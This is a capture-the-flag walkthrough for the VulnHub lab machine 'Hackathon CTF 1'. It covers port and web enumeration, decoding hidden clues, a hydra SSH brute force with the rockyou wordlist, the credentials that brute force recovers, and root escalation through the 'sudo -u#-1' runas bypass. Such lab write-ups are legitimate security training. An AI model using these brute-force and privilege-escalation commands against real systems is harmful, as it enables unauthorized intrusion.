
# Hackathon CTF 1

Available on VulnHub: https://www.vulnhub.com/entry/hackathonctf-1,591/


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.146   08:00:27:2c:7e:ae      1      xx  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 -p- 192.168.1.146
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 13:01 EST
Nmap scan report for 192.168.1.146
Host is up (0.0012s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2
23/tcp   open  telnet  Linux telnetd
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 3 disallowed entries 
|_/ctf /ftc /sudo
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 404 Not Found
7223/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 48:98:fc:58:02:9a:73:0b:c8:9a:18:53:00:f3:69:c7 (DSA)
|   2048 71:8f:f7:f7:23:7f:e6:73:f4:2b:a9:51:de:8f:d1:8d (RSA)
|   256 93:62:fe:09:7c:50:8a:1d:19:2f:4d:95:0f:fa:2c:34 (ECDSA)
|_  256 48:6e:82:29:06:a9:77:5f:08:f2:34:df:60:06:a2:cc (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.40 seconds
```

## Web Analysis

```
$ nikto -h http://192.168.1.146

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.146
+ Target Hostname:    192.168.1.146
+ Target Port:        80
+ Start Time:         2020-11-08 13:02:53 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 3 entries which should be manually viewed.
+ Server may leak inodes via ETags, header found with file /, inode: e3, size: 5b2a211a88142, mtime: gzip
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7918 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2020-11-08 13:03:10 (GMT-5) (17 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ dirb http://192.168.1.146

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Nov  8 13:02:59 2020
URL_BASE: http://192.168.1.146/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.146/ ----
+ http://192.168.1.146/index.html (CODE:200|SIZE:227)                                                                
+ http://192.168.1.146/robots.txt (CODE:200|SIZE:139)                                                                
+ http://192.168.1.146/server-status (CODE:403|SIZE:293)                                                             
                                                                                                                     
-----------------
END_TIME: Sun Nov  8 13:03:03 2020
DOWNLOADED: 4612 - FOUND: 3
```

```
$ gobuster dir -u http://192.168.1.146 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x .php,.txt,.js,/,.html

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.146
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     /,html,php,txt,js
[+] Timeout:        10s
===============================================================
2020/11/08 13:40:13 Starting gobuster
===============================================================
/index.html (Status: 200)
/robots.txt (Status: 200)
/ftc.html (Status: 200)
/sudo.html (Status: 200)
===============================================================
2020/11/08 13:42:37 Finished
===============================================================
```

## Clues

We found a Base64 blob at `http://192.168.1.146/robots.txt`
```
user-agent: *
Disallow: /ctf

user-agent: *
Disallow: /ftc

user-agent: *
Disallow: /sudo

c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==
```

Decoded Base64 blob:
```
$ echo "c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==" | base64 -d
ssh-bruteforce-sudoit
```

At `http://192.168.1.146/ftc.html` page source we found a obfuscated message.
```
<!--
#117
#115
#101
#32
#114
#111
#99
#107
#121
#111
#117
#46
#116
#120
#116
-->
</html>
```
This is a simple ASCII code.\
I made a C code to convert it:
```
$ cat ascii2char.c

#include <stdlib.h>
#include <stdio.h>

void main(void) {
	int ascii[] = {117, 115, 101, 32, 114, 111, 99, 107, 121, 111, 117, 46, 116, 120, 116};
	for (int i=0; i<sizeof(ascii)/sizeof(int); i++) printf("%c", ascii[i]);
	printf("\n");
}

$ gcc ascii2char.c -o ascii2char.o && ./ascii2char.o
use rockyou.txt
```

At page source code of `http://192.168.1.146/sudo.html` we can find the username
```
<html>
<body style="background-color:#000000">
 <h1 style="color: #f5f5f5 ; font-size: 100px ; text-align: center;">Just Sudo It..</h1>
<h1 style="color: #616161; text-align: center;">From the little spark may burst a mighty flame.</h1>

</body>

#uname : test

</html>
```

So now we found 3 clues that allow us to proceed.
* uname: test
* use rockyou.txt
* ssh-bruteforce-sudoit

## SSH Brute Forcing

Brute forcing SSH connection with `hydra` using `test` username and `rockyou.txt` wordlist.
```
$ hydra -l test -P /usr/share/wordlists/rockyou.txt 192.168.1.146 -s 7223 -vV -f -t 4 ssh

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-08 13:46:46
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://192.168.1.146:7223/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://test@192.168.1.146:7223
[INFO] Successful, password authentication is supported by ssh://192.168.1.146:7223
...
[7223][ssh] host: 192.168.1.146   login: test   password: jordan23
[STATUS] attack finished for 192.168.1.146 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-08 13:59:05
```

User: **test** \
Pass: **jordan23**

## SSH Connection

```
$ ssh test@192.168.1.146 -p7223
test@192.168.1.146's password: jordan23

Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
Last login: Sun Nov  8 11:04:53 2020 from 192.168.1.116

test@ctf:~$ id
uid=1001(test) gid=1001(test) groups=1001(test)
```

## Privilege Escalation

Looking into `.bash_history` file we found many occurrences for an file called `pass.txt`.\
So I try to find it.
```
test@ctf:/$ find . | grep pass.txt
./media/floppy0/media/imp/pass.txt

test@ctf:/$ cat ./media/floppy0/media/imp/pass.txt
Q1RGZGZyR0hZalVzU3NLS0AxMjM0NQo=
```

Decoding Base64 blob:
```
$ echo "Q1RGZGZyR0hZalVzU3NLS0AxMjM0NQo=" | base64 -d
CTFdfrGHYjUsSsKK@12345
```

Still in `.bash_history` file we can find occurrences of `sudo -u#-1 /bin/bash` command.
```
test@ctf:~$ sudo -u#-1 /bin/bash

root@ctf:~# id
uid=0(root) gid=0(root) groups=0(root)
```
